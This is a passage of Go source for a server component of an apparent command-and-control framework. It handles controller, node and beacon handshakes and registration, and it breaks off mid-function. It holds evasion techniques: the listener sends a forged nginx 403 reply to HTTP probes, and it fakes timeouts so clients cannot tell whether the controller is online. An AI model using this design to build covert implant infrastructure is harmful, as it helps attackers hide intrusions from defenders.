package node

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/davecgh/go-spew/spew"
	"github.com/pkg/errors"
	"golang.org/x/net/netutil"

	"project/internal/bootstrap"
	"project/internal/crypto/aes"
	"project/internal/crypto/curve25519"
	"project/internal/crypto/ed25519"
	"project/internal/crypto/rand"
	"project/internal/guid"
	"project/internal/logger"
	"project/internal/messages"
	"project/internal/nettool"
	"project/internal/patch/msgpack"
	"project/internal/protocol"
	"project/internal/random"
	"project/internal/security"
	"project/internal/xnet"
	"project/internal/xpanic"
)

// ErrServerClosed is returned by the server's Serve, AddListener
// methods after a call Close
var ErrServerClosed = fmt.Errorf("server closed")

// server is used to accept beacon node controller connections
type server struct {
	ctx *Node

	maxConns int           // each listener
	timeout  time.Duration // handshake timeout

	guid *guid.Generator
	rand *random.Rand

	// key = listener tag, for handleQueryListeners
	rawListeners map[string]*bootstrap.Listener

	// key = listener tag
	listeners  map[string]*xnet.Listener
	conns      map[guid.GUID]*xnet.Conn
	inShutdown int32
	rwm        sync.RWMutex

	// key = connection tag
	ctrlConns      map[guid.GUID]*ctrlConn
	ctrlConnsRWM   sync.RWMutex
	nodeConns      map[guid.GUID]*nodeConn
	nodeConnsRWM   sync.RWMutex
	beaconConns    map[guid.GUID]*beaconConn
	beaconConnsRWM sync.RWMutex

	context   context.Context
	cancel    context.CancelFunc
	closeOnce sync.Once
	wg        sync.WaitGroup
}

func newServer(ctx *Node, config *Config) (*server, error) {
	cfg := config.Server

	if cfg.MaxConns < 1 {
		return nil, errors.New("listener max connection must > 0")
	}
	if cfg.Timeout < 15*time.Second {
		return nil, errors.New("listener max timeout must >= 15s")
	}

	memory := security.NewMemory()
	defer memory.Flush()

	server := server{
		ctx:          ctx,
		maxConns:     cfg.MaxConns,
		timeout:      cfg.Timeout,
		guid:         guid.New(4, ctx.global.Now),
		rand:         random.NewRand(),
		rawListeners: make(map[string]*bootstrap.Listener),
		listeners:    make(map[string]*xnet.Listener),
		conns:        make(map[guid.GUID]*xnet.Conn),
		ctrlConns:    make(map[guid.GUID]*ctrlConn),
		nodeConns:    make(map[guid.GUID]*nodeConn),
		beaconConns:  make(map[guid.GUID]*beaconConn),
	}
	server.context, server.cancel = context.WithCancel(context.Background())

	// decrypt listeners configs
	if len(cfg.Listeners) != 0 {
		if len(cfg.ListenersKey) != aes.Key256Bit+aes.IVSize {
			return nil, errors.New("invalid aes key size")
		}
		aesKey := cfg.ListenersKey[:aes.Key256Bit]
		aesIV := cfg.ListenersKey[aes.Key256Bit:]
		defer func() {
			security.CoverBytes(aesKey)
			security.CoverBytes(aesIV)
		}()
		memory.Padding()
		data, err := aes.CBCDecrypt(cfg.Listeners, aesKey, aesIV)
		if err != nil {
			return nil, errors.WithStack(err)
		}
		security.CoverBytes(aesKey)
		security.CoverBytes(aesIV)
		memory.Padding()
		var listeners []*messages.Listener
		err = msgpack.Unmarshal(data, &listeners)
		if err != nil {
			return nil, errors.WithStack(err)
		}

		for i := 0; i < len(listeners); i++ {
			memory.Padding()
			_, err = server.addListener(listeners[i])
			if err != nil {
				return nil, err
			}
		}
	}
	return &server, nil
}

// Deploy is used to deploy added listener
func (srv *server) Deploy() error {
	// deploy all listener
	l := len(srv.listeners)
	errs := make(chan error, l)
	for tag, listener := range srv.listeners {
		go func(tag string, listener *xnet.Listener) {
			errs <- srv.deploy(tag, listener)
		}(tag, listener)
	}
	for i := 0; i < l; i++ {
		err := <-errs
		if err != nil {
			return err
		}
	}
	return nil
}

func (srv *server) logf(lv logger.Level, format string, log ...interface{}) {
	srv.ctx.logger.Printf(lv, "server", format, log...)
}

func (srv *server) log(lv logger.Level, log ...interface{}) {
	srv.ctx.logger.Println(lv, "server", log...)
}

func (srv *server) addListener(l *messages.Listener) (*xnet.Listener, error) {
	srv.rwm.Lock()
	defer srv.rwm.Unlock()
	if _, ok := srv.listeners[l.Tag]; ok {
		return nil, errors.Errorf("listener %s is already exists", l.Tag)
	}
	failed := func(err error) error {
		return errors.WithMessagef(err, "failed to add listener %s", l.Tag)
	}
	// disable client certificates
	l.TLSConfig.CertPool = srv.ctx.global.CertPool
	l.TLSConfig.ServerSide = true
	// apply tls config
	tlsConfig, err := l.TLSConfig.Apply()
	if err != nil {
		return nil, failed(err)
	}
	// <security>
	tlsConfig.Rand = rand.Reader
	tlsConfig.Time = srv.ctx.global.Now
	// fake nginx server
	if len(tlsConfig.NextProtos) == 0 {
		tlsConfig.NextProtos = []string{"http/1.1"}
	}
	opts := xnet.Options{
		TLSConfig: tlsConfig,
		Timeout:   l.Timeout,
		Now:       srv.ctx.global.Now,
	}
	listener, err := xnet.Listen(l.Mode, l.Network, l.Address, &opts)
	if err != nil {
		return nil, failed(err)
	}
	// add limit
	listener.Listener = netutil.LimitListener(listener.Listener, srv.maxConns)
	srv.listeners[l.Tag] = listener
	srv.rawListeners[l.Tag] = bootstrap.NewListener(l.Mode, l.Network, l.Address)
	return listener, nil
}

func (srv *server) deploy(tag string, listener *xnet.Listener) error {
	errCh := make(chan error, 1)
	srv.wg.Add(1)
	go srv.serve(tag, listener, errCh)
	timer := time.NewTimer(time.Second)
	defer timer.Stop()
	select {
	case err := <-errCh:
		return errors.Errorf("failed to deploy listener %s: %s", tag, err)
	case <-timer.C:
		srv.logf(logger.Info, "deploy listener %s %s", tag, listener)
		return nil
	}
}

func (srv *server) serve(tag string, listener *xnet.Listener, errCh chan<- error) {
	var err error
	defer func() {
		if r := recover(); r != nil {
			err = xpanic.Error(r, "server.serve()")
			srv.log(logger.Fatal, err)
		}
		errCh <- err
		close(errCh)
		// delete
		srv.rwm.Lock()
		defer srv.rwm.Unlock()
		delete(srv.listeners, tag)
		srv.logf(logger.Info, "listener %s %s is closed", tag, listener)
		srv.wg.Done()
	}()
	var delay time.Duration // how long to sleep on accept failure
	maxDelay := 2 * time.Second
	for {
		conn, e := listener.AcceptEx()
		if e != nil {
			if ne, ok := e.(net.Error); ok && ne.Temporary() {
				if delay == 0 {
					delay = 5 * time.Millisecond
				} else {
					delay *= 2
				}
				if delay > maxDelay {
					delay = maxDelay
				}
				srv.logf(logger.Warning, "acceptEx error: %s; retrying in %v", e, delay)
				time.Sleep(delay)
				continue
			}
			errStr := e.Error()
			if !strings.Contains(errStr, "closed") &&
				!strings.Contains(errStr, "context canceled") {
				srv.logf(logger.Warning, "acceptEx error: %s", errStr)
				err = e
			}
			return
		}
		delay = 0
		srv.wg.Add(1)
		go srv.handshake(conn)
	}
}

func (srv *server) shuttingDown() bool {
	return atomic.LoadInt32(&srv.inShutdown) != 0
}

func (srv *server) AddListener(l *messages.Listener) error {
	if srv.shuttingDown() {
		return errors.WithStack(ErrServerClosed)
	}
	listener, err := srv.addListener(l)
	if err != nil {
		return err
	}
	return srv.deploy(l.Tag, listener)
}

func (srv *server) Listeners() map[string]*xnet.Listener {
	srv.rwm.RLock()
	defer srv.rwm.RUnlock()
	listeners := make(map[string]*xnet.Listener, len(srv.listeners))
	for tag, listener := range srv.listeners {
		listeners[tag] = listener
	}
	return listeners
}

func (srv *server) GetListener(tag string) (*xnet.Listener, error) {
	srv.rwm.RLock()
	defer srv.rwm.RUnlock()
	if listener, ok := srv.listeners[tag]; ok {
		return listener, nil
	}
	return nil, errors.Errorf("listener %s is not exist", tag)
}

func (srv *server) CloseListener(tag string) error {
	srv.rwm.RLock()
	defer srv.rwm.RUnlock()
	if listener, ok := srv.listeners[tag]; ok {
		return listener.Close()
	}
	return errors.Errorf("listener %s is not exist", tag)
}

func (srv *server) Conns() map[guid.GUID]*xnet.Conn {
	srv.rwm.RLock()
	defer srv.rwm.RUnlock()
	conns := make(map[guid.GUID]*xnet.Conn, len(srv.conns))
	for tag, conn := range srv.conns {
		conns[tag] = conn
	}
	return conns
}

func (srv *server) GetConn(tag *guid.GUID) (*xnet.Conn, error) {
	srv.rwm.RLock()
	defer srv.rwm.RUnlock()
	if conn, ok := srv.conns[*tag]; ok {
		return conn, nil
	}
	return nil, errors.Errorf("conn is not exist\n%s", tag)
}

func (srv *server) CloseConn(tag *guid.GUID) error {
	srv.rwm.RLock()
	defer srv.rwm.RUnlock()
	if conn, ok := srv.conns[*tag]; ok {
		return conn.Close()
	}
	return errors.Errorf("connection is not exist\n%s", tag)
}

// CtrlConns is used to get all connections that Controller connected.
func (srv *server) CtrlConns() map[guid.GUID]*ctrlConn {
	srv.ctrlConnsRWM.RLock()
	defer srv.ctrlConnsRWM.RUnlock()
	conns := make(map[guid.GUID]*ctrlConn, len(srv.ctrlConns))
	for tag, conn := range srv.ctrlConns {
		conns[tag] = conn
	}
	return conns
}

// CloseCtrlConn is used to close Controller connection by tag.
func (srv *server) CloseCtrlConn(tag *guid.GUID) error {
	srv.ctrlConnsRWM.RLock()
	defer srv.ctrlConnsRWM.RUnlock()
	if conn, ok := srv.ctrlConns[*tag]; ok {
		conn.Close()
		return nil
	}
	return errors.Errorf("controller connection is not exist\n%s", tag)
}

// NodeConns is used to get all connections that Node connected.
func (srv *server) NodeConns() map[guid.GUID]*nodeConn {
	srv.nodeConnsRWM.RLock()
	defer srv.nodeConnsRWM.RUnlock()
	conns := make(map[guid.GUID]*nodeConn, len(srv.nodeConns))
	for tag, conn := range srv.nodeConns {
		conns[tag] = conn
	}
	return conns
}

// CloseNodeConn is used to close Node connection by tag.
func (srv *server) CloseNodeConn(tag *guid.GUID) error {
	srv.nodeConnsRWM.RLock()
	defer srv.nodeConnsRWM.RUnlock()
	if conn, ok := srv.nodeConns[*tag]; ok {
		conn.Close()
		return nil
	}
	return errors.Errorf("node connection is not exist\n%s", tag)
}

// BeaconConns is used to get all connections that Beacon connected.
func (srv *server) BeaconConns() map[guid.GUID]*beaconConn {
	srv.beaconConnsRWM.RLock()
	defer srv.beaconConnsRWM.RUnlock()
	conns := make(map[guid.GUID]*beaconConn, len(srv.beaconConns))
	for tag, conn := range srv.beaconConns {
		conns[tag] = conn
	}
	return conns
}

// CloseBeaconConn is used to close Beacon connection by tag.
func (srv *server) CloseBeaconConn(tag *guid.GUID) error {
	srv.beaconConnsRWM.RLock()
	defer srv.beaconConnsRWM.RUnlock()
	if conn, ok := srv.beaconConns[*tag]; ok {
		conn.Close()
		return nil
	}
	return errors.Errorf("beacon connection is not exist\n%s", tag)
}

// Close is used to close all listeners and connections.
func (srv *server) Close() {
	srv.closeOnce.Do(func() {
		srv.cancel()
		atomic.StoreInt32(&srv.inShutdown, 1)
		srv.rwm.Lock()
		defer srv.rwm.Unlock()
		// close all listeners
		for _, listener := range srv.listeners {
			_ = listener.Close()
		}
		// close all connections
		for _, conn := range srv.conns {
			_ = conn.Close()
		}
		srv.guid.Close()
	})
	srv.wg.Wait()
	srv.ctx = nil
}

func (srv *server) logfConn(c *xnet.Conn, lv logger.Level, format string, log ...interface{}) {
	buf := new(bytes.Buffer)
	_, _ = fmt.Fprintf(buf, format+"\n", log...)
	const conn = "---------------connection status----------------\n%s\n"
	_, _ = fmt.Fprintf(buf, conn, c)
	const endLine = "------------------------------------------------"
	_, _ = fmt.Fprint(buf, endLine)
	srv.ctx.logger.Print(lv, "server", buf)
}

func (srv *server) logConn(c *xnet.Conn, lv logger.Level, log ...interface{}) {
	buf := new(bytes.Buffer)
	_, _ = fmt.Fprintln(buf, log...)
	const conn = "---------------connection status----------------\n%s\n"
	_, _ = fmt.Fprintf(buf, conn, c)
	const endLine = "------------------------------------------------"
	_, _ = fmt.Fprint(buf, endLine)
	srv.ctx.logger.Print(lv, "server", buf)
}

func (srv *server) addConn(tag *guid.GUID, conn *xnet.Conn) {
	srv.rwm.Lock()
	defer srv.rwm.Unlock()
	srv.conns[*tag] = conn
}

func (srv *server) deleteConn(tag *guid.GUID) {
	srv.rwm.Lock()
	defer srv.rwm.Unlock()
	delete(srv.conns, *tag)
}

func (srv *server) addCtrlConn(tag *guid.GUID, conn *ctrlConn) {
	srv.ctrlConnsRWM.Lock()
	defer srv.ctrlConnsRWM.Unlock()
	if _, ok := srv.ctrlConns[*tag]; !ok {
		srv.ctrlConns[*tag] = conn
	}
}

func (srv *server) deleteCtrlConn(tag *guid.GUID) {
	srv.ctrlConnsRWM.Lock()
	defer srv.ctrlConnsRWM.Unlock()
	delete(srv.ctrlConns, *tag)
}

func (srv *server) addNodeConn(tag *guid.GUID, conn *nodeConn) {
	srv.nodeConnsRWM.Lock()
	defer srv.nodeConnsRWM.Unlock()
	if _, ok := srv.nodeConns[*tag]; !ok {
		srv.nodeConns[*tag] = conn
	}
}

func (srv *server) deleteNodeConn(tag *guid.GUID) {
	srv.nodeConnsRWM.Lock()
	defer srv.nodeConnsRWM.Unlock()
	delete(srv.nodeConns, *tag)
}

func (srv *server) addBeaconConn(tag *guid.GUID, conn *beaconConn) {
	srv.beaconConnsRWM.Lock()
	defer srv.beaconConnsRWM.Unlock()
	if _, ok := srv.beaconConns[*tag]; !ok {
		srv.beaconConns[*tag] = conn
	}
}

func (srv *server) deleteBeaconConn(tag *guid.GUID) {
	srv.beaconConnsRWM.Lock()
	defer srv.beaconConnsRWM.Unlock()
	delete(srv.beaconConns, *tag)
}

func (srv *server) handshake(conn *xnet.Conn) {
	defer func() {
		if r := recover(); r != nil {
			srv.logConn(conn, logger.Exploit, xpanic.Print(r, "server.handshake"))
		}
		_ = conn.Close()
		srv.wg.Done()
	}()
	// add to server.conns for management
	tag := srv.guid.Get()
	srv.addConn(tag, conn)
	defer srv.deleteConn(tag)
	// check connection and send certificate
	_ = conn.SetDeadline(time.Now().Add(srv.timeout))
	if !srv.checkConn(conn) {
		return
	}
	if !srv.sendCertificate(conn) {
		return
	}
	// receive challenge and sign it
	challenge := make([]byte, protocol.ChallengeSize)
	_, err := io.ReadFull(conn, challenge)
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to receive challenge")
		return
	}
	_, err = conn.Write(srv.ctx.global.Sign(challenge))
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to send challenge signature")
		return
	}
	// receive role
	r := make([]byte, 1)
	_, err = io.ReadFull(conn, r)
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to receive role")
		return
	}
	role := protocol.Role(r[0])
	switch role {
	case protocol.Ctrl:
		srv.handshakeWithCtrl(tag, conn)
	case protocol.Node:
		srv.handshakeWithNode(tag, conn)
	case protocol.Beacon:
		srv.handshakeWithBeacon(tag, conn)
	default:
		srv.logConn(conn, logger.Exploit, role)
	}
}

// checkConn is used to check connection is from client.
// If read http request, return a fake http response.
func (srv *server) checkConn(conn *xnet.Conn) bool {
	// read generated random data size
	size := make([]byte, 1)
	_, err := io.ReadFull(conn, size)
	if err != nil {
		const format = "failed to check connection\n%s"
		srv.logfConn(conn, logger.Error, format, err)
		return false
	}
	// read random data
	randomData := make([]byte, size[0])
	n, err := io.ReadFull(conn, randomData)
	total := append(size, randomData[:n]...)
	if err != nil {
		const format = "receive test data in checkConn\n%s\n\n%X"
		srv.logfConn(conn, logger.Error, format, total, total)
		return false
	}
	if srv.isHTTPRequest(total, conn) {
		return false
	}
	// write generated random data
	_, err = conn.Write(srv.rand.Bytes(int(size[0])))
	return err == nil
}

var nginxBody = strings.ReplaceAll(`<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx</center>
</body>
</html>
`, "\n", "\r\n")

func (srv *server) isHTTPRequest(data []byte, conn *xnet.Conn) bool {
	// check is http request
	lines := strings.Split(string(data), "\r\n")
	// GET / HTTP/1.1
	rl := strings.Split(lines[0], " ") // request line
	if len(rl) != 3 {
		return false
	}
	if !strings.Contains(rl[2], "HTTP") {
		return false
	}
	// read the remaining data
	go func() {
		defer func() {
			if r := recover(); r != nil {
				buf := xpanic.Print(r, "server.isHTTPRequest")
				srv.logConn(conn, logger.Error, buf)
			}
		}()
		_, _ = io.Copy(ioutil.Discard, conn)
	}()
	// write 403 response
	buf := new(bytes.Buffer)
	// status line
	_, _ = fmt.Fprintf(buf, "%s 403 Forbidden\r\n", rl[2])
	// fake nginx server
	buf.WriteString("Server: nginx\r\n")
	// write date
	date := srv.ctx.global.Now().Local().Format(http.TimeFormat)
	_, _ = fmt.Fprintf(buf, "Date: %s\r\n", date)
	// other
	buf.WriteString("Content-Type: text/html\r\n")
	_, _ = fmt.Fprintf(buf, "Content-Length: %d\r\n", len(nginxBody))
	buf.WriteString("Connection: keep-alive\r\n\r\n")
	buf.WriteString(nginxBody)
	_, _ = buf.WriteTo(conn)
	return true
}

func (srv *server) sendCertificate(conn *xnet.Conn) bool {
	var err error
	cert := srv.ctx.global.GetCertificate()
	if cert != nil {
		_, err = conn.Write(cert)
	} else { // if no certificate, send random certificate with Node GUID and public key
		cert := protocol.Certificate{
			GUID:      *srv.ctx.global.GUID(),
			PublicKey: srv.ctx.global.PublicKey(),
		}
		cert.Signatures[0] = srv.rand.Bytes(ed25519.SignatureSize)
		cert.Signatures[1] = srv.rand.Bytes(ed25519.SignatureSize)
		_, err = conn.Write(cert.Encode())
	}
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to send certificate:", err)
		return false
	}
	return true
}

func (srv *server) handshakeWithCtrl(tag *guid.GUID, conn *xnet.Conn) {
	// <danger>
	// maybe fake node will send some special data
	// and controller sign it
	challenge := srv.rand.Bytes(protocol.ChallengeSize)
	err := conn.Send(challenge)
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to send challenge to controller:", err)
		return
	}
	// receive signature
	signature, err := conn.Receive()
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to receive controller signature:", err)
		return
	}
	// verify signature
	if !srv.ctx.global.CtrlVerify(challenge, signature) {
		srv.logConn(conn, logger.Exploit, "invalid controller signature")
		return
	}
	// send succeed response
	err = conn.Send(protocol.AuthSucceed)
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to send response to controller:", err)
		return
	}
	srv.serveCtrl(tag, conn)
}

func (srv *server) handshakeWithNode(tag *guid.GUID, conn *xnet.Conn) {
	nodeGUID := guid.GUID{}
	_, err := io.ReadFull(conn, nodeGUID[:])
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to receive node guid:", err)
		return
	}
	// check is self
	if nodeGUID == *srv.ctx.global.GUID() {
		srv.logConn(conn, logger.Warning, "oh! self")
		return
	}
	// read operation
	operation := make([]byte, 1)
	_, err = io.ReadFull(conn, operation)
	if err != nil {
		srv.logConn(conn, logger.Exploit, "failed to receive node operation", err)
		return
	}
	switch operation[0] {
	case protocol.NodeOperationRegister:
		srv.registerNode(conn, &nodeGUID)
	case protocol.NodeOperationConnect:
		if !srv.verifyNode(conn, &nodeGUID) {
			return
		}
		srv.serveNode(tag, conn, &nodeGUID)
	case protocol.NodeOperationUpdate:
		if !srv.verifyNode(conn, &nodeGUID) {
			return
		}
		srv.serveRoleUpdate(conn, protocol.Node, &nodeGUID)
	default:
		srv.logfConn(conn, logger.Exploit, "unknown node operation %d", operation[0])
	}
}

// prevent block when close the Node.
func (srv *server) sleep(t time.Duration) bool {
	timer := time.NewTimer(t)
	defer timer.Stop()
	select {
	case <-timer.C:
		return true
	case <-srv.context.Done():
		return false
	}
}

// <security> client can't known Controller is online.
func (srv *server) fakeTimeout(begin time.Time, conn *xnet.Conn) {
	RTT := srv.ctx.global.Now().Sub(begin)
	if !srv.sleep(messages.MaxRegisterWaitTime - RTT) {
		return
	}
	_, _ = conn.Write([]byte{messages.RegisterResultTimeout})
}

func (srv *server) registerNode(conn *xnet.Conn, guid *guid.GUID) {
	// send external address
	err := conn.Send(nettool.EncodeExternalAddress(conn.RemoteAddr().String()))
	if err != nil {
		const log = "failed to send node external address:"
		srv.logConn(conn, logger.Error, log, err)
		return
	}
	// Node send self key exchange public key (curve25519),
	// use session key encrypt register request data.
	//
	// +----------------+----------------+
	// | kex public key | encrypted data |
	// +----------------+----------------+
	// |    32 Bytes    |       var      |
	// +----------------+----------------+
	//
	// receive encrypted Node register request
	request, err := conn.Receive()
	if err != nil {
		const log = "failed to receive node register request:"
		srv.logConn(conn, logger.Error, log, err)
		return
	}
	// check size
	if len(request) < curve25519.ScalarSize+aes.BlockSize {
		const log = "receive invalid encrypted node register request"
		srv.logConn(conn, logger.Exploit, log)
		return
	}
	// send to Controller
	encRR := messages.EncryptedRegisterRequest{
		KexPublicKey: request[:curve25519.ScalarSize],
		EncRequest:   request[curve25519.ScalarSize:],
	}
	begin := srv.ctx.global.Now()
	reply, err := srv.ctx.messageMgr.Send(srv.context, messages.CMDBNodeRegisterRequestFromNode,
		&encRR, true, messages.MaxRegisterWaitTime)
	if err != nil {
		srv.fakeTimeout(begin, conn)
		return
	}
	response := reply.(*messages.NodeRegisterResponse)
	// check GUID
	if *guid != response.GUID {
		srv.logConn(conn, logger.Exploit, "different guid in node register response")
		return
	}
	_ = conn.SetWriteDeadline(time.Now().Add(srv.timeout))
	switch response.Result {
	case messages.RegisterResultAccept:
		_, _ = conn.Write([]byte{messages.RegisterResultAccept})
		_, _ = conn.Write(response.Certificate)
		_ = conn.Send(response.NodeListeners)
	case messages.RegisterResultRefused:
		srv.fakeTimeout(begin, conn)
		// TODO add IP block list only register(other role still pass)
		// and <firewall> rate limit
	default:
		const format = "unknown node register result: %d"
		srv.logfConn(conn, logger.Exploit, format, response.Result)
	}
}

func (srv *server) verifyNode(conn *xnet.Conn, guid *guid.GUID) bool {
	challenge := srv.rand.Bytes(protocol.ChallengeSize)
	err := conn.Send(challenge)
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to send challenge to node:", err)
		return false
	}
	// receive signature
	signature, err := conn.Receive()
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to receive node signature:", err)
		return false
	}
	nk := srv.getNodeKey(guid)
	if nk == nil {
		return false
	}
	// verify signature
	if !ed25519.Verify(nk.PublicKey, challenge, signature) {
		srv.logConn(conn, logger.Exploit, "invalid node challenge signature")
		return false
	}
	// send succeed response
	_ = conn.SetWriteDeadline(time.Now().Add(srv.timeout))
	err = conn.Send(protocol.AuthSucceed)
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to send response to node:", err)
		return false
	}
	return true
}

func (srv *server) getNodeKey(guid *guid.GUID) *protocol.NodeKey {
	// first try to query from self storage.
	nk := srv.ctx.storage.GetNodeKey(guid)
	if nk != nil {
		return nk
	}
	// if it doesn't exist in self storage, try to query from Controller.
	qnk := messages.QueryNodeKey{
		GUID: *guid,
		Time: srv.ctx.global.Now(),
	}
	begin := srv.ctx.global.Now()
	reply, err := srv.ctx.messageMgr.Send(srv.context, messages.CMDBNodeQueryNodeKey,
		&qnk, true, messages.MaxQueryWaitTime)
	RTT := srv.ctx.global.Now().Sub(begin)
	duration := messages.MaxQueryWaitTime - RTT
	if err != nil {
		// <security> client can't known Controller is online.
		srv.sleep(duration)
		return nil
	}
	ank := reply.(*messages.AnswerNodeKey)
	// check it is exists
	if ank.GUID.IsZero() {
		srv.sleep(duration)
		return nil
	}
	// check is wanted Node key
	if ank.GUID != *guid {
		srv.sleep(duration)
		return nil
	}
	// save to local storage
	nk = &protocol.NodeKey{
		PublicKey:    ank.PublicKey,
		KexPublicKey: ank.KexPublicKey,
		ReplyTime:    ank.ReplyTime,
	}
	srv.ctx.storage.AddNodeKey(guid, nk)
	return nk
}

func (srv *server) handshakeWithBeacon(tag *guid.GUID, conn *xnet.Conn) {
	beaconGUID := guid.GUID{}
	_, err := io.ReadFull(conn, beaconGUID[:])
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to receive beacon guid:", err)
		return
	}
	// read operation
	operation := make([]byte, 1)
	_, err = io.ReadFull(conn, operation)
	if err != nil {
		srv.logConn(conn, logger.Exploit, "failed to receive beacon operation", err)
		return
	}
	switch operation[0] {
	case protocol.BeaconOperationRegister:
		srv.registerBeacon(conn, &beaconGUID)
	case protocol.BeaconOperationConnect:
		if !srv.verifyBeacon(conn, &beaconGUID) {
			return
		}
		srv.serveBeacon(tag, conn, &beaconGUID)
	case protocol.BeaconOperationUpdate:
		if !srv.verifyBeacon(conn, &beaconGUID) {
			return
		}
		srv.serveRoleUpdate(conn, protocol.Beacon, &beaconGUID)
	default:
		srv.logfConn(conn, logger.Exploit, "unknown beacon operation %d", operation[0])
	}
}

func (srv *server) registerBeacon(conn *xnet.Conn, guid *guid.GUID) {
	// send external address
	err := conn.Send(nettool.EncodeExternalAddress(conn.RemoteAddr().String()))
	if err != nil {
		const log = "failed to send beacon external address:"
		srv.logConn(conn, logger.Error, log, err)
		return
	}
	// Beacon send self key exchange public key (curve25519),
	// use session key encrypt register request data.
	//
	// +----------------+----------------+
	// | kex public key | encrypted data |
	// +----------------+----------------+
	// |    32 Bytes    |       var      |
	// +----------------+----------------+
	//
	// receive encrypted Beacon register request
	request, err := conn.Receive()
	if err != nil {
		const log = "failed to receive beacon register request:"
		srv.logConn(conn, logger.Error, log, err)
		return
	}
	// check size
	if len(request) < curve25519.ScalarSize+aes.BlockSize {
		const log = "receive invalid encrypted beacon register request"
		srv.logConn(conn, logger.Exploit, log)
		return
	}
	// send to Controller
	encRR := messages.EncryptedRegisterRequest{
		KexPublicKey: request[:curve25519.ScalarSize],
		EncRequest:   request[curve25519.ScalarSize:],
	}
	begin := srv.ctx.global.Now()
	reply, err := srv.ctx.messageMgr.Send(srv.context, messages.CMDBNodeRegisterRequestFromBeacon,
		&encRR, true, messages.MaxRegisterWaitTime)
	if err != nil {
		srv.fakeTimeout(begin, conn)
		return
	}
	response := reply.(*messages.BeaconRegisterResponse)
	// check GUID
	if *guid != response.GUID {
		srv.logConn(conn, logger.Exploit, "different guid in beacon register response")
		return
	}
	_ = conn.SetWriteDeadline(time.Now().Add(srv.timeout))
	switch response.Result {
	case messages.RegisterResultAccept:
		_, _ = conn.Write([]byte{messages.RegisterResultAccept})
		_ = conn.Send(response.NodeListeners)
	case messages.RegisterResultRefused:
		srv.fakeTimeout(begin, conn)
		// TODO add IP block list only register(other role still pass)
		// and <firewall> rate limit
	default:
		const format = "unknown beacon register result: %d"
		srv.logfConn(conn, logger.Exploit, format, response.Result)
	}
}

func (srv *server) verifyBeacon(conn *xnet.Conn, guid *guid.GUID) bool {
	challenge := srv.rand.Bytes(protocol.ChallengeSize)
	err := conn.Send(challenge)
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to send challenge to beacon:", err)
		return false
	}
	// receive signature
	signature, err := conn.Receive()
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to receive beacon signature:", err)
		return false
	}
	bk := srv.getBeaconKey(guid)
	if bk == nil {
		return false
	}
	// verify signature
	if !ed25519.Verify(bk.PublicKey, challenge, signature) {
		srv.logConn(conn, logger.Exploit, "invalid beacon challenge signature")
		return false
	}
	// send succeed response
	_ = conn.SetWriteDeadline(time.Now().Add(srv.timeout))
	err = conn.Send(protocol.AuthSucceed)
	if err != nil {
		srv.logConn(conn, logger.Error, "failed to send response to beacon:", err)
		return false
	}
	return true
}

func (srv *server) getBeaconKey(guid *guid.GUID) *protocol.BeaconKey {
	// First try to query from self storage.
	bk := srv.ctx.storage.GetBeaconKey(guid)
	if bk != nil {
		return bk
	}
	// if it doesn't exist in self storage, try to query from Controller.
	qbk := messages.QueryBeaconKey{
		GUID: *guid,
		Time: srv.ctx.global.Now(),
	}
	begin := srv.ctx.global.Now()
	reply, err := srv.ctx.messageMgr.Send(srv.context, messages.CMDBNodeQueryBeaconKey,
		&qbk, true, messages.MaxQueryWaitTime)
	RTT := srv.ctx.global.Now().Sub(begin)
	duration := messages.MaxQueryWaitTime - RTT
	if err != nil {
		// <security> client can't known Controller is online.
		srv.sleep(duration)
		return nil
	}
	abk := reply.(*messages.AnswerBeaconKey)
	// check it is exists
	if abk.GUID.IsZero() {
		srv.sleep(duration)
		return nil
	}
	// check is wanted Beacon key
	if abk.GUID != *guid {
		srv.sleep(duration)
		return nil
	}
	// save to local storage
	bk = &protocol.BeaconKey{
		PublicKey:    abk.PublicKey,
		KexPublicKey: abk.KexPublicKey,
		ReplyTime:    abk.ReplyTime,
	}
	srv.ctx.storage.AddBeaconKey(guid, bk)
	return bk
}

func (srv *server) serveRoleUpdate(conn *xnet.Conn, role protocol.Role, guid *guid.GUID) {
	// read request
	request := make([]byte, protocol.UpdateNodeRequestSize)
	_, err := io.ReadFull(conn, request)
	if err != nil {
		const format = "failed to receive %s update node request: %s\n%s"
		srv.logfConn(conn, logger.Error, format, role, err, guid.Print())
		return
	}
	// send to Controller
	unr := messages.UpdateNodeRequest{Data: request}
	var cmd []byte
	switch role {
	case protocol.Node:
		cmd = messages.CMDBNodeUpdateNodeRequestFromNode
	case protocol.Beacon:
		cmd = messages.CMDBNodeUpdateNodeRequestFromBeacon
	default:
		panic(fmt.Sprintf("server: invalid role: %s", role))
	}
	reply, err := srv.ctx.messageMgr.Send(srv.context, cmd, &unr, false, 15*time.Second)
	if err != nil {
		const format = "failed to send %s update node request to controller: %s\n%s"
		srv.logfConn(conn, logger.Error, format, role, err, guid.Print())
		return
	}
	// write response to Node or Beacon
	_, _ = conn.Write(reply.(*messages.UpdateNodeResponse).Data)
}

// ---------------------------------------serve Controller-----------------------------------------

type ctrlConn struct {
	ctx *Node

	Tag  *guid.GUID
	Conn *conn

	inSync int32
	syncMu sync.Mutex
}

func (srv *server) serveCtrl(tag *guid.GUID, conn *xnet.Conn) {
	cc := ctrlConn{
		ctx:  srv.ctx,
		Tag:  tag,
		Conn: newConn(srv.ctx, conn, tag, connUsageServeCtrl),
	}
	defer func() {
		if r := recover(); r != nil {
			cc.Conn.Log(logger.Fatal, xpanic.Print(r, "server.serveCtrl"))
		}
		// logoff forwarder
		cc.syncMu.Lock()
		defer cc.syncMu.Unlock()
		if cc.isSync() {
			srv.ctx.forwarder.LogoffCtrl(tag)
